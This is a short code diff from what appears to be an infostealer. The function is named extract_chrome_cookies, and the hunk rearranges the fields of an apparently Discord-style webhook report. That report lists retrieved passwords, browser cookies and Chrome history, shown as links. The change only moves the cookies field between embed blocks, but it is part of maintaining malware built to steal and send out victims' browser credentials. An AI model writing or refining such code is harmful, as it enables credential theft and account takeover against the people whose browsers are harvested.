@@ -181,14 +181,14 @@ def extract_chrome_cookies(output_file="chrome_cookies.txt"):
                 {
                     "title": "Credentials",
                     "fields": [
-                        {"name": ":key: Retrieved passwords :", "value": f"```{pass_link}```", "inline": True}
+                        {"name": ":key: Retrieved passwords :", "value": f"```{pass_link}```", "inline": True},
+                        {"name": ":cookie: Cookies :", "value": f"```{cookies_link}```", "inline": True}
                     ]
                 },
                 {
                     "title": "Credentials",
                     "fields": [
-                        {"name": ":globe_with_meridians: Chrome History :", "value": f"```{history_link}```", "inline": True},
-                        {"name": ":cookie: Cookies :", "value": f"```{cookies_link}```", "inline": True}
+                        {"name": ":globe_with_meridians: Chrome History :", "value": f"```{history_link}```", "inline": True}
                     ]
                 }
             ]
